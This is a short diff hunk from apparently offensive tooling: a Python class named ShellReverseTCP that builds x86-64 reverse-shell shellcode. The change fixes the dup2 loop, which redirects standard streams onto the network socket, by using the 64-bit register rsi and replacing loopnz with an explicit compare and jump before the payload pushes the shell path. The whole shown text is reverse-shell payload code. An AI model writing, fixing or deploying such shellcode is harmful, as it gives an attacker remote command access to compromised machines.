@@ -64,9 +64,11 @@ class ShellReverseTCP(HatAsm, HatVenom, Consts):
 
         dup:
             mov al, 33
-            dec esi
+            dec rsi
             syscall
-            loopnz dup
+
+            cmp rsi, 0
+            jne dup
 
             push rax
             mov rbx, 0x{self.shell.hex()}
